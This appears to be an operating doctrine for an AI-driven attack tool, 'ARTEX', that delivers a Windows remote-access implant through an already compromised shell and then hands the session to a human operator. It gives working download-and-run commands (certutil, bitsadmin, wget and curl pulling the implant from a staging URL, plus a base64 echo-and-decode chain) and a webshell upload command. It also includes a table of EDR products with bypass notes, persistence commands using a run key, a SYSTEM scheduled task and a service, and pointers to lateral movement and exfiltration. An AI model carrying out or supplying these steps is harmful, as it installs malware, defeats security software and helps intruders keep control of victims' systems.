# C2 Handoff — Delivery Assist Doctrine

Delivery-assist module for a Windows RAT implant. ARTEX stages and delivers the binary
via an already-obtained shell, then hands off to the operator. No RAT API — no session
management, no remote execution. Delivery only.

---

## Delivery Vectors by Shell Type

| Shell type     | Recommended vector  | Reasoning |
|----------------|---------------------|-----------|
| webshell_php   | webshell_upload     | POST multipart upload through the existing shell endpoint |
| rce_cmd        | echo_b64            | cmd-only RCE; no wget/curl; certutil always present on Win |
| sqli_exec      | echo_b64            | xp_cmdshell/OPENROWSET — cmd context, no download utility |
| ssh            | wget / curl         | Linux/Unix target with standard download tools available |
| rce_powershell | certutil / bitsadmin| PowerShell context; certutil present; bitsadmin as fallback |

---

## Command Sequences by Vector

### echo_b64 (cmd-only targets, no download utility)
```
echo <b64_chunk_1> > C:\Windows\Temp\svc.exe.b64
echo <b64_chunk_2> >> C:\Windows\Temp\svc.exe.b64
...
certutil -decode C:\Windows\Temp\svc.exe.b64 C:\Windows\Temp\svc.exe && del C:\Windows\Temp\svc.exe.b64
```
Use `c2_deliver_implant(vector="echo_b64", ...)` — ARTEX reads the binary, encodes it, and
generates the full chain automatically. Chunk size 4096 chars stays under cmd.exe line limits.

### certutil (PowerShell / cmd, HTTP reachable staging server)
```
certutil -urlcache -split -f STAGING_URL/implant.exe C:\Windows\Temp\svc.exe
```

### bitsadmin (PowerShell / cmd fallback)
```
bitsadmin /transfer job /download STAGING_URL/implant.exe C:\Windows\Temp\svc.exe
```

### wget (Linux/ssh)
```
wget STAGING_URL/implant.exe -O /tmp/svc
chmod +x /tmp/svc
```

### curl (Linux/ssh or modern Windows)
```
curl -s STAGING_URL/implant.exe -o C:\Windows\Temp\svc.exe
```

### webshell_upload (PHP/ASP/JSP webshell with file upload)
```
curl -s -X POST -F "file=@/local/path/to/implant.exe" http://TARGET/webshell.php
```
Adapt the field name and endpoint to match the deployed shell.

---

## EDR Catalog for Operator Decision

`check_edr` findings inform the operator; **operator decides** what to do.
Do NOT auto-execute post-delivery steps — hand off once delivery is confirmed.

| EDR / AV           | Key indicator (process / path)           | Known bypass notes (operator's call) |
|--------------------|------------------------------------------|---------------------------------------|
| Windows Defender   | MsMpEng.exe / SmartScreen.exe            | PPL process; PPLDUMP / BYOVD required for kill |
| CrowdStrike Falcon | CSFalconService.exe / CSAgent.exe        | Kernel sensor; BYOVD or userland sleep/jitter |
| SentinelOne        | SentinelAgent.exe / SentinelStaticEngine | Aggressive tamper protection; hard to kill without BYOVD |
| Carbon Black       | CbDefense.exe / RepMgr.exe               | Userland hooks; unhook ntdll or use direct syscalls |
| Cylance            | CylanceSvc.exe                           | Static ML AV; heavy binary entropy focus; pack/encrypt |
| ESET NOD32/Protect | ekrn.exe / ERAAgent.exe                  | Userland; API hooking; direct syscall + hashed imports helps |
| Sophos             | SophosNTQuarantineService.exe            | Userland hooks; tamper protection via service; BYOVD |
| Trend Micro        | PccNTMon.exe / tmwscsvc.exe              | Multiple components; target the scanning engine |
| Kaspersky          | avp.exe / kavtray.exe                    | AMSI hooks; kernel component; hard to fully disable |
| Bitdefender        | bdagent.exe / vsserv.exe                 | Ring0 minifilter; file-less staging reduces signature hits |
| No AV detected     | —                                        | Standard payload delivery; operator verifies before proceeding |

Operator reviews EDR state from the check_edr finding and makes the bypass decision.
ARTEX does not auto-bypass; it only delivers the binary.

---

## Post-Handoff Checklist (Operator)

After `c2_await_operator` returns — operator takes over:

1. **Verify check-in**: confirm the implant beacon/heartbeat in the RAT console.
2. **Review EDR finding**: read the `check_edr` finding; plan bypass if needed before any noisy action.
3. **Establish persistence** (if in scope):
   - Registry run key: `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /t REG_SZ /d "C:\Windows\Temp\svc.exe"`
   - Scheduled task: `schtasks /create /tn svc /tr C:\Windows\Temp\svc.exe /sc onlogon /ru SYSTEM`
   - Service: `sc create svc binpath= "C:\Windows\Temp\svc.exe" start= auto`
4. **OPSEC review**: check for AV quarantine, verify binary is still on disk.
5. **Lateral movement**: plan next hop based on findings (credentials, Kerberoast, PtH/PtT).
6. **Exfil staging**: use exfiltrate tool for data collection; clean up staging artifacts.

---

## Cleanup Commands (Shell-Based — No RAT API)

Since the RAT exposes no cleanup API, removal is shell-based via the original access vector.

### Remove binary from target
```cmd
del /f /q C:\Windows\Temp\svc.exe
```

### Remove persistence (registry)
```cmd
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /f
```

### Remove persistence (scheduled task)
```cmd
schtasks /delete /tn svc /f
```

### Remove persistence (service)
```cmd
sc stop svc & sc delete svc
```

### Remove staging artifacts (b64 temp file)
```cmd
del /f /q C:\Windows\Temp\svc.exe.b64
```

### Linux/ssh cleanup
```sh
rm -f /tmp/svc
```

---

## Tool Sequence

```
1. check_edr(target)                        # operator reviews; informs bypass decision
2. c2_stage_implant(arch="x64")             # verify binary present locally
3. c2_deliver_implant(vector=..., ...)      # get delivery command; execute via shell/exec
4. c2_await_operator(target_host, status)   # handoff — operator takes the session
```
